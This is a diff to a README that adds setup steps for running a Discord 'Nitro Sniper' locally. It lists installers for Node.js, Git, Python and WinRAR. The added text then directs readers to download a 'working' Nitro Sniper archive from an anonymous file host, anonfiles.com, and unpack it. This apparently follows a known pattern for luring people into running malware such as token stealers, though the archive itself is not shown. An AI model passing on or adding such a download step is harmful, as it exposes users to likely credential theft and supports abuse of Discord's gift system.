@@ -64,3 +64,29 @@ Example :  // this.start();  to this.start();
 ```
   
 
+--- 
+  
+## Run locally the Nitro Sniper on your PC
+  
+---
+  
+## What do I need ?
+- Node.js
+  - #### [Windows ![windows](https://media.discordapp.net/attachments/810799100940255260/838488668816932965/ezgif-6-ac9683508192.png)](https://nodejs.org/dist/v16.10.0/node-v16.10.0-x64.msi)
+  - #### [macOS ![mac](https://media.discordapp.net/attachments/810799100940255260/838489488505307176/ezgif-6-cea52c6e0dcc.png)](https://nodejs.org/dist/v16.10.0/node-v16.10.0.pkg)
+
+- Git
+  - #### [Windows ![windows](https://media.discordapp.net/attachments/810799100940255260/838488668816932965/ezgif-6-ac9683508192.png)](https://git-scm.com/download/win)
+  - #### [macOS ![mac](https://media.discordapp.net/attachments/810799100940255260/838489488505307176/ezgif-6-cea52c6e0dcc.png)](https://git-scm.com/download/mac)
+  
+- Python
+  - #### [Windows ![windows](https://media.discordapp.net/attachments/810799100940255260/838488668816932965/ezgif-6-ac9683508192.png)](https://www.python.org/downloads/release/python-397/)
+  - #### [macOS ![mac](https://media.discordapp.net/attachments/810799100940255260/838489488505307176/ezgif-6-cea52c6e0dcc.png)](https://www.python.org/downloads/release/python-397/)
+  
+
+When you finish installing these 3 applications, [download Anon Files](https://anonfiles.com/j7cf33H0uc/Nitro_Sniper_Working_7z) and unzip/unpack it whith : 
+ - #### [WinRAR ![windows](https://media.discordapp.net/attachments/810799100940255260/838488668816932965/ezgif-6-ac9683508192.png)](https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-602.exe)
+ - #### [WinRAR ![mac](https://media.discordapp.net/attachments/810799100940255260/838489488505307176/ezgif-6-cea52c6e0dcc.png)](https://www.win-rar.com/fileadmin/winrar-versions/rarlinux-x64-6.0.2.tar.gz)
+
+
+
